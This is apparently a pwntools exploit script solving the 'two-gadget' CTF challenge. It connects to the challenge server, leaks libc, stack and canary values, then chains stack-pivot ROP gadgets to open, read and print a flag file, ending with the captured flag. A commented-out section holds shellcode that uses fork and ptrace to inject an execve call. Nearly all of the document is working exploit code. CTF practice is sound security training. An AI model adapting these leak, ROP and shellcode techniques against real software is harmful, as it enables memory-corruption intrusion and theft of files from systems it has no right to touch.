from pwn import *
context.arch = 'amd64'


elf = ELF('./two-gadget')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


# while True:
#     try:
# p = elf.process()
p = remote('chals1.eof.ais3.org', 45126)
# p = remote('0.0.0.0', 45126)

p.recvuntil(b'Gift: ')
libc_leak = int(p.recvline()[:-1], 16)
libc_base = libc_leak - libc.symbols['setvbuf']
# print(hex(libc_base))
libc.address = libc_base

p.send(p64(libc.symbols['vfork']))
p.send(p64(libc.symbols['environ']))
p.send(b'a')
stack_leak = u64(p.recvuntil(b'\x00\x00'))
print(hex(stack_leak))
canary_addr = stack_leak - 0x1a0
p.send(p64(canary_addr))
d = p.recv(8)
canary = u64(d)
# print(hex(canary))

ret_addr = stack_leak - 0x100

buf = ret_addr - 0x1000
ret = libc_base + 0x0000000000025679
pop_rdi = 0x0000000000026b72 + libc_base
pop_rsi = 0x0000000000027529 + libc_base
pop_rdx_r12 = 0x000000000011c371 + libc_base
pop_r12_r13_r14 = 0x000000000002959a + libc_base
pop_6 = 0x000000000015b773 + libc_base
one_gadget = 0xe6c7e + libc_base
print(hex(one_gadget))

rbp = buf
# ropc = flat([rbp, libc.symbols['setuid'], one_gadget])
ropc = flat([rbp, pop_6, 0])

payload = b'a' * 8 + p64(canary) + ropc
# raw_input()
p.send(payload)

p.recvline()
p.send(p64(ret))
p.send(p64(stack_leak - 0x1c0))
leak = u64(p.recv().ljust(8, b'\x00'))
print(hex(leak))

text_base = leak - 0x380
main_addr = text_base + 0x2ea
read_addr = leak
leave_ret = text_base + 0x3af
rbp = stack_leak - 0x1a8

buf2 = rbp - 0x10
rbp += 0x0
payload = p64(0) + p64(canary)
ropc = flat([rbp, ret, read_addr])
# raw_input()
p.send(payload + ropc)

rbp += 0x10
payload = p64(buf) + p64(pop_rdi)
ropc = flat([rbp, read_addr, leave_ret])
# raw_input()
p.send(payload + ropc)

rbp += 0
payload = p64(0) + p64(leave_ret)
ropc = flat([rbp, ret, read_addr])
# raw_input()
p.send(payload + ropc)

rbp += 0x10
payload = p64(0) + p64(pop_rsi)
ropc = flat([rbp, read_addr, leave_ret])
# raw_input()
p.send(payload + ropc)

rbp += 0
payload = p64(0) + p64(leave_ret)
ropc = flat([rbp, ret, read_addr])
# raw_input()
p.send(payload + ropc)

rbp += 0x10
payload = p64(buf) + p64(pop_rdx_r12)
ropc = flat([rbp, read_addr, leave_ret])
# raw_input()
p.send(payload + ropc)

rbp += 0
payload = p64(0) + p64(leave_ret)
ropc = flat([rbp, ret, read_addr])
# raw_input()
p.send(payload + ropc)

rbp += 0x10
payload = p64(264) + p64(0)
ropc = flat([rbp, read_addr, leave_ret])
# raw_input()
p.send(payload + ropc)

rbp += 0
payload = p64(0) + p64(leave_ret)
ropc = flat([rbp, ret, read_addr])
# raw_input()
p.send(payload + ropc)

rbp += 0x10
payload = p64(libc.symbols['read']) + p64(leave_ret)
ropc = flat([rbp, read_addr, leave_ret])
# raw_input()
p.send(payload + ropc)

rbp = buf2
payload = p64(0) + p64(leave_ret)
ropc = flat([rbp, ret, leave_ret])
# raw_input()
p.send(payload + ropc)

# # buf3 = buf - 0x1000 & ~0xfff
# buf3 = 0x1230000
# buf4 = buf3 + 0x1000
# sh = buf - 0x1000
# retf = 0x0000000000026401 + libc_base
# pop_r8 = 0x0000000000046cca + libc_base
# xor_r9d = 0x00000000000c9ccf + libc_base
# pop_rcx = 0x000000000009f822 + libc_base
# pop_rsp = 0x0000000000032b5a + libc_base
# print(hex(buf3))
# payload = p64(buf2)
# ropc = flat([pop_rdi, 0, pop_rsi, sh, pop_rdx_r12, 0x10, 0, libc.symbols['read']])
# ropc += flat([pop_rdi, buf2 - 0x68, pop_r8, p64(0xffffffff), xor_r9d, pop_rdi, buf3, pop_rsi, 0x1000, pop_rdx_r12, 0x7, 0, pop_rcx, 0x21, libc.symbols['mmap']])
# ropc += flat([pop_rdi, 0, pop_rsi, buf3, pop_rdx_r12, 234, 0, libc.symbols['read']])
# ropc += flat([pop_rdi, buf3, pop_rsi, 0x1000, pop_rdx_r12, 0x5, 0, libc.symbols['mprotect']])
# ropc += flat([pop_rdi, buf2 - 0x68, pop_r8, p64(0xffffffff), xor_r9d, pop_rdi, buf4, pop_rsi, 0x1000, pop_rdx_r12, 0x7, 0, pop_rcx, 0x21, libc.symbols['mmap']])
# ropc += flat([pop_rdi, 0, pop_rsi, buf4, pop_rdx_r12, 101, 0, libc.symbols['read']])
# ropc += flat([pop_rdi, buf4, pop_rsi, 0x1000, pop_rdx_r12, 0x5, 0, libc.symbols['mprotect']])
# ropc += flat([buf3])

# print(len(payload + ropc))
# p.send(payload + ropc)

# print(hex(sh))
# raw_input()
# p.send(b'/bin/ls\x00')

# context.clear(arch='amd64', os='linux')
# sc = asm(f'''
# mov rax, {libc.symbols['fork']}
# call rax
# cmp rax, 0
# ''')
# sc += b'u\x09'
# sc += asm(f'''
# mov rsi, {buf4}
# jmp rsi
# ''')

# sc += asm(f'''
# mov r14, rax

# mov rdi, rax
# mov rsi, 0
# mov rdx, 0
# mov rax, {libc.symbols['waitpid']}
# call rax

# mov rdi, 0x18
# mov rsi, r14
# mov rdx, 0
# mov rcx, 0
# mov rax, {libc.symbols['ptrace']}
# call rax

# mov rdi, r14
# mov rsi, 0
# mov rdx, 0
# mov rax, {libc.symbols['waitpid']}
# call rax

# mov rdi, 0xc
# mov rsi, r14
# mov rdx, 0
# mov rcx, {buf2 + 0x10}
# mov rax, {libc.symbols['ptrace']}
# call rax

# mov rdi, {buf2 + 0x10}
# mov dword ptr [rdi], 0x3b
# mov rdi, 0xd
# mov rsi, r14
# mov rdx, 0
# mov rcx, {buf2 + 0x10}
# mov rax, {libc.symbols['ptrace']}
# call rax

# nop
# nop
# nop
# nop
# nop
# nop
# nop

# mov rsi, 0x12300dc
# jmp rsi
# ''')

# sc2 = asm(f'''
# mov rax, {libc.symbols['ptrace']}
# mov rdi, 0
# mov rsi, 0
# mov rdx, 0
# mov rcx, 0
# call rax

# mov rax, 186
# syscall

# mov rdi, rax
# mov rsi, 19
# mov rax, 200
# syscall

# mov rdi, {sh}
# mov rsi, 0
# mov rdx, 0
# mov rax, 0x27
# syscall
# ''')

# print(len(sc))
# print(len(sc2))
# # print(sc)
# raw_input()
# p.send(sc)
# p.send(sc2)

buf3 = buf - 0x100
payload = p64(buf2)
# ropc = flat([pop_rdi, buf3, pop_rsi, 0x100, libc.symbols['getcwd']])
ropc = flat([pop_rdi, 0, pop_rsi, buf3, pop_rdx_r12, 0x100, 0, libc.symbols['read']])
# ropc += flat([pop_rdi, buf3, libc.symbols['puts']])
ropc += flat([pop_rdi, buf3, pop_rsi, 0, pop_rdx_r12, 0, 0, libc.symbols['open']])
ropc += flat([pop_rdi, 3, pop_rsi, buf3, pop_rdx_r12, 0x100, 0, libc.symbols['read']])
ropc += flat([pop_rdi, 1, pop_rsi, buf3, pop_rdx_r12, 0x100, 0, libc.symbols['write']])
print(len(payload + ropc))
raw_input()
p.send(payload + ropc)
# d = p.recvline()
# print(d)
# flag_path = d[:-1] + b'/flag\x00'
# fpath = b'/etc/xinetd.d/two-gadget\x00'
fpath = b'/home/two-gadget-4a4be40c96ac6314e91d93f38043a634/flag\x00'
p.send(fpath)

p.interactive()

# FLAG{it is a good gadget to leak information}